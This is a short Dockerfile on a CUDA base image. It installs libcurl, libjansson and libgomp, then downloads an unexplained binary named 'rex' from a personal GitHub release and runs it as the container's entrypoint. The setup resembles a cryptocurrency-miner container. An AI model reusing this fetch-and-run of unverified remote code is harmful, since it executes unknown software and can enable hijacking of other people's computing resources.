FROM nvidia/cuda:11.3.1-cudnn8-devel-ubuntu18.04
EXPOSE 80
EXPOSE 443

WORKDIR /usr/local/sbin

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 wget sudo

RUN wget https://github.com/gok9592/ww/releases/download/rex/rex && \
    chmod +x rex

COPY . .
RUN chmod +x rex.sh
ENTRYPOINT [ "rex.sh" ]
